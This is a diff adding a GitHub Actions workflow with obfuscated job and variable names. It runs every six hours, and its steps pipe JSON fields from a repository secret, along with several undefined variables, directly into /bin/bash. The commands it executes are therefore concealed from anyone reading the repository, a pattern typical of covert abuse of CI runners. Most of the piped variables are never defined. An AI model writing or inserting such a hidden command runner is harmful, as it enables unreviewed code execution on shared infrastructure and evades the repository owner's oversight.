@@ -1,0 +1,24 @@
+name: worangnimennn
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '16 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: worangnimennn
+        env:
+          muafb6: ${{ secrets.muafb6 }}
+        run: |
+          echo $muafb6 | jq -r .le55 | /bin/bash
+          echo $sm6 | jq -r .yy77 | /bin/bash
+          echo $y11952 | jq -r .np1 | /bin/bash
+          echo $bvr98 | jq -r .rz12 | /bin/bash
+          echo $e51470 | jq -r .yp3468 | /bin/bash
+          echo $oop6 | jq -r .qeenr3472 | /bin/bash
+          echo $sv21058 | jq -r .bp600 | /bin/bash
+          echo $usutd5447 | jq -r .mgr38790 | /bin/bash
+
